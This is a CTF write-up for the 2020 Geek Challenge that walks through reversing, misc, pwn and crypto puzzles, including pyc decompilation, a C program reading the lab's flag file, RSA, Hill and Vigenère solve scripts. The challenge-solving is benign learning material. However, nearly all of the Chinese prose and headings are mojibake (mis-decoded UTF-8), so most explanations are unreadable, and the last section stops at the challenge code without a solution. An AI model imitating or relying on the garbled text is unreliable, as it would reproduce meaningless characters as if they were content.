numArray=[18,14,40,-14,-2,30,10,42,35,48,43,49,52,72,57,68,86,145,115,128,115,86]
list=[101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211]
flag=''
for i in range(0,22):
    flag+=chr(list[i]-numArray[i])
print(flag)
```



### un_snake

#### è€ƒç‚¹ï¼šä»£ç å®¡è®¡ï¼Œpycæ–‡ä»¶åç¼–è¯‘

é¢˜ç›®ç»™äº†ä¸€ä¸ªpycæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦å‡†å¤‡ä¸€ä¸ªpythonåº“ï¼Œ**uncompyle6**ï¼Œå¯ä»¥ç›´æ¥å°†pycæ–‡ä»¶åç¼–è¯‘ä¸ºpyæ–‡ä»¶

> pycæ–‡ä»¶åŒçº§ç›®å½•ä¸‹ï¼Œcmd ï¼šuncompyle6 -o pcat.py pcat.pyc



æ¥ä¸‹æ¥å°±æ˜¯éœ€è¦å¯¹ä»£ç è¿›è¡Œå®¡è®¡äº†

```python
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.3 (tags/v3.8.3:6f8c832, May 13 2020, 22:37:02) [MSC v.1924 64 bit (AMD64)]
# Embedded file name: ./un_snake.py
# Compiled at: 2020-08-05 16:20:40
# Size of source mod 2**32: 1238 bytes



import this
from base64 import *

def pre(data):
    th1s = 'TBESCFSRSAEUITANAIIN'.encode()
    if (data_len := len(data)) > (th1s_len := len(th1s)):
        th1s = th1s * (data_len // th1s_len) + th1s[:data_len - th1s_len]
    return bytes(map(lambda x, y: x ^ y, data, th1s))       # dataå’Œth1sè¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œè¿”å›2è¿›åˆ¶


def enc(plain):
    plain = list(plain)
    plain = plain[::-1]
    for i in range(len(plain)):
        c = plain[i]
        plain[i] = (c << 3 | c >> 5) & 255
    else:
        for i in range(len(plain) - 1):
            plain[i] ^= plain[(i + 1)]
        else:
            return bytes(plain)


def check(a):
    return b64encode(a) == b'mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg='


if __name__ == '__main__':
    print()
    while True:
        stuff = input('Now input you flag:')
        stuff_ready = pre(stuff.encode())
        result = check(enc(stuff_ready))
        if result:
            print('You get it! Python is so charming right?')
            break
        else:
            print('Failed, try again!')

    print('[ğŸ] Commit you flag, see you next time!')
```

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªpython3.8ç‰ˆæœ¬è¿›è¡Œç¼–è¾‘çš„ï¼Œä¸éš¾å†™å‡ºè¿˜åŸä»£ç ï¼š

```python
from base64 import *

a = b'mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg='
flag = b64decode(a)

flag = list(flag)
n = len(flag) - 1

for i in range(len(flag) - 1):
    flag[(n - i - 1)] ^= flag[(n - i)]
else:
    for i in range(len(flag)):
        c = flag[i]
        flag[i] = (c >> 3 | c << 5) & 255

flag = flag[::-1]
flag = bytes(flag)


th1s = 'TBESCFSRSAEUITANAIIN'.encode()
if (flag_len := len(flag)) > (th1s_len := len(th1s)):
    th1s = th1s * (flag_len // th1s_len) + th1s[:flag_len - th1s_len]

flag = bytes(map(lambda x, y: x ^ y,flag, th1s))

print(flag)
```

**è¡¥å……ï¼š**

> ä»python3.8å¼€å§‹ï¼Œæµ·è±¡è¿ç®—ç¬¦è·å¾—æ­£å¼pythonç‰ˆæœ¬çš„æ”¯æŒ
>
> `:=`ï¼šæµ·è±¡è¿ç®—ç¬¦ï¼Œä¼šæŠŠè¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†èµ‹å€¼ç»™å˜é‡ï¼Œæé«˜äº†è¿è¡Œé€Ÿåº¦
>
> ä¸‹é¢ä¸¤ä¸ªçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼š
>
> ```
> if (n := len(a)) > 10:
>     print(f"List is too long ({n} elements, expected <= 10)")
> ```
>
> ```
> n = len(a)
> if n > 10:
>     print(f"List is to long({n} elements, expected <= 10)")
> ```





## Misc

### ä¸€â€œé¡µâ€éšœç›®

#### è€ƒç‚¹ï¼šæ‹¼å›¾

![2020æå®¢å¤§æŒ‘æˆ˜-ä¸€é¡µéšœç›®](images/2020æå®¢å¤§æŒ‘æˆ˜-ä¸€é¡µéšœç›®.png)

å³è¾¹æ‹¼èµ·æ¥å°±è¡Œäº†

> SYC{syc_20_ver}



### å£®è¨€å£®è¯­

#### è€ƒç‚¹ï¼šä½›æ›°è§£ç 

> ä½›æ›°ï¼šè±†æ¢µèƒ½ä½›å†¥è¬¹æ²™æ€¯éš¸é“ç­‰å­•å–ä¼½è¨¶æå¥¢è€¶å°¼æ®¿æ€¯æ€–å¥¢ä¸‰ç¼½å—æ€›ç¼½å¨‘çš¤å¯«æ•¸çš¤ç©¶å‘è€…é†¯çš¤å‹å­•çš¤é¡›çš¤è€¶å¤œå“†æ‚‰ä¾„ç¾¯æ¶…æ‚‰æ€¯è€è‹¥ä¿±å‹è©çŸ¥è©æ‰€è˜‡å¥¢ä»¥æ¢µä¸–å¿ƒäº¦å‘è€¨å¤·å“†è‡³å“†é†¯å³æ³¢æ€¯æ˜é™¤æ€¯é—æ€¯é›†æ€¯å°¼æ˜çš¤å¯¦æ€¯ä¸€å¿ƒç¼½å‘¼ä¾„ç¾¯å¤¢å®¤è«³è€¨å‘æè¿¦æ¢µéƒ½éƒ½å‘å­•ç¤™è«³é‚£å‘å½Œè±†ç¼½æ™ºé®è«³æ§ƒæä¼½ä¿±ç©†é›¢å†¥ä¼Šå†¥é‚£è—ç½°æ‘©è¿¦è«³æœ‰è«³ç›¡å³æ€¯å¤šé€ä¾„å©†å†¥æ¶…ç¥

ç”¨ä½›æ›°è§£ç å°±å¥½äº†

```
æˆ‘åˆ˜å£®å°±æ˜¯npï¼Œç»™ä½ flagå§,SYC{i_l0ve_Japanese_wife}
```



### ç§˜æŠ€Â·åå¤æ¨ªè·³

#### è€ƒç‚¹ï¼šbinwalk

é¢˜ç›®ç»™äº†ä¸€å¼ ç…§ç‰‡ï¼Œä½†æ˜¯æç¤ºbinwalkï¼Œè¿™æ˜¯å†å›¾ç‰‡é‡Œè—äº†ä¸œè¥¿ï¼Œæˆ‘ä»¬ç”¨binwalkæ‰“å¼€

```
binwalk -e FFHT.jpg
```

å¾—åˆ°è¿™ä¸ªäºŒç»´ç ï¼Œæˆ‘ä»¬æ‹¼æˆæ­£å¸¸çš„æ‰«ç å°±å¥½äº†

![2020æå®¢å¤§æŒ‘æˆ˜-åå¤æ¨ªè·³](images/2020æå®¢å¤§æŒ‘æˆ˜-åå¤æ¨ªè·³.png)



### æ¥æ‹¼å›¾

#### è€ƒç‚¹ï¼šå°±æ˜¯æ‹¼ä¸ªå›¾

æ‰‹å·¥ï¼Œçœ‹åˆ°å†™äº†å­—çš„å›¾å°±æ‹¿å‡ºæ¥ï¼Œæ‹¼å°±å®Œäº†

å†™è„šæœ¬ï¼Œå°è¯•äº†ï¼Œæ•ˆæœä¸å¤ªå¥½ï¼Œå°±ä¸ç”¨äº†





## Pwn

### æ•°å­¦å’‹æ ·ï¼Ÿ

ncè¿ä¸Šåš20é“é¢˜ç›®å°±å¥½äº†



### runcode

#### è€ƒç‚¹ï¼šcè¯­è¨€

é¢˜ç›®æç¤ºï¼š

> flagåœ¨/home/ctf/flagï¼Œ ä¸å…è®¸å‡ºç°system, å‡ºç°runtime erroråˆ™é‡æ–°runä¸€ä¸‹

æˆ‘ä»¬å†™ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„cç¨‹åºå°±å¥½äº†

```c
#include <stdio.h>
 
int main()
{
   FILE *fp = NULL;
   char buff[255];
 
   fp = fopen("/home/ctf/flag", "r");
   fscanf(fp, "%s", buff);
   printf("1: %s\n", buff );
}
```



## Crypto

### äºŒæˆ˜æƒ…æŠ¥å‘˜åˆ˜å£®

#### è€ƒç‚¹ï¼šæ‘©æ–¯å¯†ç 

>  .-../.----/..-/--../..../..-/....-/-./--./..--.-/../..--.-/--../.----/-.--/.----

SYC{l1uzhu4ng_i_z1y1}



### é“ ç”²ä¸è¨æ»¡

#### è€ƒç‚¹ï¼šå‡¯æ’’å¯†ç 

> YEI{roafnagtmroafnagtm_hgtmhgtmhgtm}

é€šè¿‡å‡¯æ’’å¯†ç è§£å¾—

> SYC{liuzhuangliuzhuang_bangbangbang}



### è·³è·ƒçš„æŒ‡å°–

é¢˜ç›®æè¿°:

> wdr qsz awdx thu xdv eft thu ol rgy ilp(æ³¨æ„è¯·å°†è¯·å°†ç­”æ¡ˆå¥—ä¸ŠSYC{}æäº¤)

å¾ˆç®€ç­”ï¼Œå°±æ˜¯é”®ç›˜å¯†ç 



### æˆéƒ½å…»çŒªäºŒå‚

#### è€ƒç‚¹ï¼šçŒªåœˆå¯†ç +æ …æ å¯†ç 

æç¤ºï¼š

> vå…ˆç”Ÿå®¶é‡Œè›®å¤§çš„ï¼Œè¿˜æœ‰å¾ˆå¤šå•¤é…’ã€‚vå…ˆç”Ÿä¹‹æ‰€ä»¥èƒ½è¿‡ä¸Šè¿™æ ·å¿«å“‰çš„ç”Ÿæ´»å¯èƒ½æ˜¯å› ä¸ºä»–çš„å…»çŒªåœºå‚å›´ä¸Šäº†é«˜é«˜çš„æ …æ 

![2020æå®¢å¤§æŒ‘æˆ˜-æˆéƒ½å…»çŒªäºŒå‚](images/2020æå®¢å¤§æŒ‘æˆ˜-æˆéƒ½å…»çŒªäºŒå‚.jpg)

> vå…ˆç”Ÿå–å¾—è¿·è¿·ç³Šç³Šçš„æ—¶å€™è¯´äº†ä¸€äº›èƒ¡è¯,ä½ ä»ä¸€å †å˜Ÿå“ä¸­å¬æ¸…æ¥šäº†å…¶ä¸­ä¸€å°æ®µ:
>
> ...(å˜Ÿå“)..
> (int)sth_import = 889464/114514;
> ....(å˜Ÿå“)...

è¿™é‡Œé™¤äº†å¯†ç è¿˜æœ‰ä¸ªæç¤ºï¼Œè§£å‡ºç­”æ¡ˆä¸º7ï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œåº”è¯¥å°±æ˜¯æ …æ å¯†ç çš„**æ æ•°**

> (int)sth_import = 889464/114514;

ç°åœ¨å°±æ¥ç ´è§£çŒªåœˆå¯†ç ï¼Œè¿™é‡Œçš„å¯†ç æ˜¯æ‰‹å†™çš„ï¼Œè€Œä¸”å¹¶æ²¡æœ‰æç¤ºä¸€ä¸ªæ˜ç¡®çš„é¡ºåºè¿›è¡Œç ´è§£ï¼Œç†è®ºä¸Šå››ä¸ªæ–¹å‘ä¸Šè¿›è¡Œè§£å¯†éƒ½æ˜¯å¯ä»¥çš„ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æœ€å¤šç ´è§£4æ¬¡å°±èƒ½å‡ºæ¥

> æœ€åè§£å¾—ï¼šssyirceehsagiulisolbhy
>
> å†ç”¨7æ è¿›è¡Œè§£å¯†ï¼šsreausbschglohyesiilyi



### è§„è§„çŸ©çŸ©çš„å·¥ä½œ

#### è€ƒç‚¹ï¼šå¸Œå°”åŠ å¯†

æç¤ºï¼š

> wlzå½“å¹´ç©è¹¦è¹¦è¹¦ä¸ºäº†æŠ½å¸Œå°”æ°ªäº†å¾ˆå¤šé’±
>
> hint1:è®©æˆ‘çœ‹çœ‹æ˜¯è°ä¸å¥½å¥½ä¸Šçº¿ä»£è¯¾ï¼Ÿ
>
> hint2:decodeç¨‹åºå¯èƒ½åŠ è½½çš„æœ‰ç‚¹æ…¢å¹¶ä¸”è¯·åœ¨å‘½ä»¤è¡Œå†…è¿è¡Œ

çœ‹åˆ°**å¸Œå°”+çº¿æ€§ä»£æ•°**ã€‚ç«‹é©¬å°±èƒ½ååº”åˆ°è€ƒçš„æ˜¯**å¸Œå°”å¯†ç **ï¼Œè¿™æ˜¯æ¯”è¾ƒç®€å•çš„çº¿æ€§ä»£æ•°ï¼Œå…ˆçœ‹çœ‹ä»€ä¹ˆæ˜¯å¸Œå°”åŠ å¯†

![2020æå®¢å¤§æŒ‘æˆ˜-å¸Œå°”å¯†ç ](images/2020æå®¢å¤§æŒ‘æˆ˜-å¸Œå°”å¯†ç .png)

çœ‹äº†åŠ å¯†æ‰‹æ³•è®©æˆ‘æƒ³èµ·äº†**ä»¿å°„å¯†ç åŠ å¯†**ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„åŠ å¯†ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†

åœ¨äº†è§£äº†åŠ è§£å¯†åŸç†åï¼Œç°åœ¨æˆ‘ä»¬å†æ¥çœ‹çœ‹é¢˜ç›®

> key_encrypt
> 1 1 1
> 1 2 3
> 1 3 6
>
> encï¼š
> 12
> 12
> 10

å¾ˆæ˜æ˜¾ï¼Œä¸Šé¢ä¸€ä¸ªçŸ©é˜µå°±æ˜¯å¯†é’¥äº†ï¼Œä¸‹é¢çš„å°±æ˜¯å¯†æ–‡

æˆ‘ä»¬å…ˆæ±‚å¾—å¯†é’¥çš„é€†çŸ©é˜µï¼š
$$
\left[
\matrix{
1&1&1\\
1&2&3\\
1&3&6\\
}
\right]

\quad
 -->
 \quad
 
\left[
\matrix{
3&-3&1\\
-3&5&-2\\
1&-2&1\\
}
\right]
$$
å†æ ¹æ®è§£å¯†å…¬å¼æ±‚è§£ï¼š
$$
\left[
\matrix{
3&-3&1\\
-3&5&-2\\
1&-2&1\\
}
\right]

\quad
\cdot
\quad

\left[
\matrix{
12\\
12\\
10\\
}
\right]

\quad
\cdot
\quad

\mod(26)
$$
æœ€åå¾—åˆ°
$$
\left[
\matrix{
10\\
4\\
-2\\
}
\right]

\quad
\cdot
\quad

\mod(26)

\quad
=
\quad

'KEY'
$$
å†ç»™çš„ç¨‹åºè¾“å…¥å°±å¯ä»¥å¾—åˆ°ç­”æ¡ˆäº†



### babyRSA

#### è€ƒç‚¹ï¼šRSAåŠ å¯†

```python
from crypto.Util.number import *
from gmpy2 import *
from secret import p,flag
flag = bytes_to_long(bytes(flag, encoding='utf-8'))
q = getPrime(1024)
n = q*p
phi_ = (p-1)*(q-1)
e = 0x10001
d = invert(e,phi_)
c = (pow(flag, e, n))

print(long_to_bytes(pow(c, d, n)))
print((c,q,n))
'''out put
(177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194, 166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043, 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149)
'''
```

è¿™é‡Œç®€å•çš„è¿›è¡Œäº†RSAçš„åŠ å¯†æ¼”ç¤º

åœ¨æ³¨é‡Šä¸€æ ç»™äº†æˆ‘ä»¬Cï¼Œqï¼Œnï¼Œåœ¨ä¸Šé¢è¿˜ç»™äº†æˆ‘ä»¬Eï¼Œå¯ä»¥è¯´è¯¥ç»™çš„éƒ½ç»™äº†ï¼Œé‚£å°±å¾ˆç®€å•äº†

æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬è¿›è¡Œè§£ç 

```python
import libnum
from crypto.Util.number import long_to_bytes

q = int(
  "166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043",
    10)
p = int("1145143",10)
e = int(
    "0x10001",
    16)
c = 177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194

n = q * p

d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)  # m çš„åè¿›åˆ¶å½¢å¼
string = long_to_bytes(m)  # mæ˜æ–‡
print(string)  # ç»“æœä¸º bâ€˜ m â€™ çš„å½¢å¼
```



### Simple calculation

#### è€ƒç‚¹ï¼šçº¿æ€§åŒä½™æ–¹ç¨‹ç»„

æç¤ºï¼š

> çº¿æ€§åŒä½™æ–¹ç¨‹ç»„çš„è§£å¯ä»¥ç”±ä¸­å›½ä½™æ•°å®šç†æä¾›

![2020æå®¢å¤§æŒ‘æˆ˜-calculation](images/2020æå®¢å¤§æŒ‘æˆ˜-calculation.png)



ç®€å•çš„æ¥è¯´ï¼Œå°±æ˜¯

> S0 x S1 x S2 x S3 x S4  = 26 x k1 + 3
>
> S0 x S1 x S2 x 3\*S3 x 5\*S4  = 26 x k2 + 7
>
> S0 x 2\*S1 x 2\*S2 x 3\*S3 x 3\*S4  = 26 x k3 + 1
>
> S0 x 2\*S1 x 5\*S2 x 3\*S3 x S4  = 26 x k4 + 1
>
> S0 x 2\*S1 x S2 x 2\*S3 x S4  = 26 x k5 + 20

æˆ‘è§‰å¾—çš„æ˜¯æœ‰ä¸€ç‚¹åƒ**ç™¾é’±ä¹°ç™¾é¸¡é—®é¢˜**çš„ï¼Œéšä¾¿æäº†ä¸€ä¸ªç®€å•çš„è„šæœ¬

```python
a = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

for i in range(0,26):
    for j in range(0, 26):
        for k in range(0, 26):
            for l in range(0, 26):
                for m in range(0, 26):
                    if (i+j+k+l+m)%26 == 3 and(i+j+k+3*l+5*m)%26 == 7 and(i+2*j+2*k+3*l+3*m)%26 == 1 and(i+2*j+5*k+3*l+m)%26 == 1 and(i+2*j+k+2*l+m)%26 == 20:

                        print("{}{}{}{}{}".format(a[i],a[j],a[k],a[l],a[m]))
```



### éŸ¡é«»çŒŠå²ˆ

#### è€ƒç‚¹ï¼šç»´å‰å°¼äºšå¯†ç 

æç¤ºï¼š

> Why not start with the short one,or make full use of Ur powerful pc and the Internet

å¯†æ–‡

```
Oowfza errqbbirtqpl ks afiiklr cifgd ho unvhxnigkctm bugokz iaf chnxhvek tkvgnvf xeccmjkr; errqbbirtqpve aehwektana nte wfavinxe iequge kbopnuigkogbt ucrwomfu altczrtbpvf, oadjvt uuvi iyiokjbuos abzq vo usmnm ig TGP vhxsm vu nh umnts bo dviegfzr
```

è®°å¾—æœ€æ—©æœ‰åšè¿‡ä¸€é“é¢˜ï¼Œé¢˜ç›®çš„åå­—ä¹Ÿæ˜¯åƒè¿™ä¸ªä¸€æ ·çš„ï¼Œæ˜¯**ä¸­æ–‡ç”Ÿåƒ»å­—**ï¼Œä½†è¯»éŸ³æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„ä¿¡æ¯æˆ‘ä»¬å°±æ‹¿è°·æ­Œç¿»è¯‘è¯»ä¸€ä¸‹ï¼Œåœ¨è‹±æ–‡æ¨¡å¼ä¸‹è¿›è¡Œæœ—è¯»ï¼Œå‡ºç°äº†**ç»´å‰å°¼äºš**ï¼Œokå¯ä»¥åŸºæœ¬é”å®šæ˜¯ç»´å‰å°¼äºšå¯†ç äº†

ç»´å‰å°¼äºšå¯†ç æœ€é‡è¦çš„æ˜¯æ‰¾åˆ°å¯†é’¥ï¼Œå¯†æ–‡ä¸­çš„å”¯ä¸€ä¸‰ä¸ªè¿åœ¨ä¸€èµ·çš„å¤§å†™å¸å¼•äº†æ³¨æ„åŠ›ï¼Œåæ¨å›å¯†é’¥ä¸­åº”è¯¥æœ‰**bin**ä¸‰ä¸ªå­—ç¬¦ï¼Œä½†åˆ°è¿™é‡Œå°±æ²¡æ³•ç»§ç»­äº†

åœ¨æŸ¥é˜…èµ„æ–™åå‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬åˆ†æå¯†æ–‡ï¼Œæ¥æ¨æµ‹å‡ºå¯†é’¥çš„é•¿åº¦ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº†è‹±æ–‡æ¯ä¸ªå­—æ¯çš„è¯é¢‘ï¼Œåœ¨æ¨æµ‹å¯†é’¥æ˜¯ä»€ä¹ˆ

æœ€åè´´å‡ºå¤§ç¥çš„è„šæœ¬

```python
#coding=utf-8
#-*- coding:utf-8 â€“*-
def c_alpha(cipher):   # å»æ‰éå­—æ¯åçš„å¯†æ–‡
    cipher_alpha = ''
    for i in range(len(cipher)):
        if (cipher[i].isalpha()):
            cipher_alpha += cipher[i]
    return cipher_alpha

# è®¡ç®—cipherçš„é‡åˆæŒ‡æ•°
def count_CI(cipher):
    N = [0.0 for i in range(26)]
    cipher = c_alpha(cipher)
    L = len(cipher)
    if cipher == '':
        return 0
    else:
        for i in range(L):     #è®¡ç®—æ‰€æœ‰å­—æ¯çš„é¢‘æ•°ï¼Œå­˜åœ¨æ•°ç»„Nå½“ä¸­
            if (cipher[i].islower()):
                 N[ord(cipher[i]) - ord('a')] += 1
            else:
                 N[ord(cipher[i]) - ord('A')] += 1
    CI_1 = 0
    for i in range(26):
        CI_1 += ((N[i] / L) * ((N[i]-1) / (L-1)))
    return CI_1

# è®¡ç®—ç§˜é’¥é•¿åº¦ä¸º key_len çš„é‡åˆæŒ‡æ•°
def count_key_len_CI(cipher,key_len):
    un_cip = ['' for i in range(key_len)]    # un_cip æ˜¯åˆ†ç»„
    aver_CI = 0.0
    count = 0
    for i in range(len(cipher_alpha)):
        z = i % key_len
        un_cip[z] += cipher_alpha[i]
    for i in range(key_len):
        un_cip[i]= count_CI(un_cip[i])
        aver_CI += un_cip[i]
    aver_CI = aver_CI/len(un_cip)
    return aver_CI

## æ‰¾å‡ºæœ€å¯èƒ½çš„å‰åä¸ªç§˜é’¥é•¿åº¦
def pre_10(cipher):
    M = [(1,count_CI(cipher))]+[(0,0.0) for i in range(49)]
    for i in range(2,50):
        M[i] = (i,abs(0.065 - count_key_len_CI(cipher,i)))
    M = sorted(M,key = lambda x:x[1])   #æŒ‰ç…§æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ æ’åº
    for i in range(1,10):
        print (M[i])

F = [
0.0651738, 0.0124248, 0.0217339,
0.0349835, 0.1041442, 0.0197881,
0.0158610, 0.0492888, 0.0558094,
0.0009033, 0.0050529, 0.0331490,
0.0202124, 0.0564513, 0.0596302,
0.0137645, 0.0008606, 0.0497563,
0.0515760, 0.0729357, 0.0225134,
0.0082903, 0.0171272, 0.0013692,
0.0145984, 0.0007836
]       # è‹±æ–‡å­—ç¬¦é¢‘ç‡ã€‚



cipher = input('è¯·è¾“å…¥ç»´å‰å°¼äºšå¯†æ–‡ï¼š')
cipher_alpha = c_alpha(cipher)
print(u"çŒœæµ‹çš„ç§˜é’¥é•¿åº¦ä¸º:")
pre_10(cipher)



# çŒœæµ‹å•ä¸ªç§˜é’¥å¾—åˆ°çš„é‡åˆæŒ‡æ•°
def count_CI2(cipher,n):     # n ä»£è¡¨æˆ‘ä»¬çŒœæµ‹çš„ç§˜é’¥ï¼Œä¹Ÿå³åç§»é‡
    N = [0.0 for i in range(26)]
    cipher = c_alpha(cipher)
    L = len(cipher)
    for i in range(L):     #è®¡ç®—æ‰€æœ‰å­—æ¯çš„é¢‘æ•°ï¼Œå­˜åœ¨æ•°ç»„Nå½“ä¸­
        if (cipher[i].islower()):
            N[(ord(cipher[i]) - ord('a') - n)%26] += 1
        else:
            N[(ord(cipher[i]) - ord('A') - n)%26] += 1
    CI_2 = 0
    for i in range(26):
        CI_2 += ((N[i] / L) * F[i])
    return CI_2

def one_key(cipher,key_len):
    un_cip = ['' for i in range(key_len)]
    cipher_alpha = c_alpha(cipher)
    for i in range(len(cipher_alpha)):     # å®Œæˆåˆ†ç»„å·¥ä½œ
        z = i % key_len
        un_cip[z] += cipher_alpha[i]
    for i in range(key_len):
        print (i)
        pre_5_key(un_cip[i])     ####è¿™é‡Œåº”è¯¥å°†5ä¸ªåˆ†ç»„çš„ç§˜é’¥çŒœæµ‹å…¨éƒ¨æ‰“å°å‡ºæ¥

## æ‰¾å‡ºå‰5ä¸ªæœ€å¯èƒ½çš„å•ä¸ªç§˜é’¥
def pre_5_key(cipher):
    M = [(0,0.0) for i in range(26)]
    for i in range(26):
        M[i] = (chr(ord('a')+i),abs(0.065 - count_CI2(cipher,i)))
    M = sorted(M,key = lambda x:x[1])   #æŒ‰ç…§æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ æ’åº

    for i in range(10):
        print (M[i])

key_len = int(input('è¯·è¾“å…¥çŒœæµ‹çš„å¯†é’¥é•¿åº¦ï¼š'))   #è¾“å…¥çŒœæµ‹çš„ç§˜é’¥é•¿åº¦
one_key(cipher,key_len)
```

æœ€åå¯ä»¥å¾—åˆ°**å¯†é’¥é•¿åº¦ä¸º6ï¼Œå¯†é’¥ä¸ºcatbin**



### childRSA

#### è€ƒç‚¹ï¼šRSAå°æŒ‡æ•°eçˆ†ç ´

æç¤ºï¼š

> vå…ˆç”Ÿæœ‰ä¸€è¾¹å¬å¹¿æ’­ä¸€è¾¹ç å­—çš„åä¹ æƒ¯ã€‚ä¸ºäº†ä¿è¯codingå·¥ä½œçš„æ­£ç¡®æ€§ï¼Œvå…ˆç”Ÿä»Šå¤©æŠŠæ•°æ®å¤šç®—äº†å‡ é

é¢˜ç›®ç»™äº†æˆ‘ä»¬ä¸€ä¸ªç®—æ³•ï¼Œå’Œä¸‰ç»„æ•°æ®ï¼Œå…¶ä¸­æˆ‘ä»¬çŸ¥é“äº†**e=3ï¼Œä¸‰ç»„c&n**

è¿™ä¸ªeæ˜¯å°çš„ï¼Œç›´æ¥ååº”åˆ°å°æŒ‡æ•°çˆ†ç ´

> å½“e=3æ—¶ï¼Œå¦‚æœæ˜æ–‡è¿‡å°ï¼Œå¯¼è‡´æ˜æ–‡çš„ä¸‰æ¬¡æ–¹ä»ç„¶å°äºnï¼Œé‚£ä¹ˆé€šè¿‡ç›´æ¥å¯¹å¯†æ–‡ä¸‰æ¬¡å¼€æ–¹ï¼Œå³å¯å¾—åˆ°æ˜æ–‡
>
> åŸç†ï¼šåŠ å¯†ä¸ºc=m^e mod n    è§£å¯†ä¸ºm=c^d mod n
>
> åˆ†æï¼šå¦‚æœeè¿‡å°ï¼ˆm^e<næˆ–è€…m^e<2*nï¼‰ å°±å¯ä»¥ç›´æ¥å¯¹cå¼€æ–¹ã€‚ m^e=k*n+c

æ‰€ä»¥ç›´æ¥è„šæœ¬çˆ†ç ´

```python
from Crypto.PublicKey import RSA
from secret import flag
from Crypto.Util.number import bytes_to_long, long_to_bytes


M_ = bytes_to_long(bytes(flag, encoding='utf-8'))

Cipher = []
for i in range(3):
    rsa = RSA.generate(1024, e=3)
    print("n{} = {}".format(i+1,hex(rsa.n)))
    C_ = (pow(M_,rsa.e,rsa.n))  # m e n
    print("c{} = {}".format(i+1, hex(C_)))
```

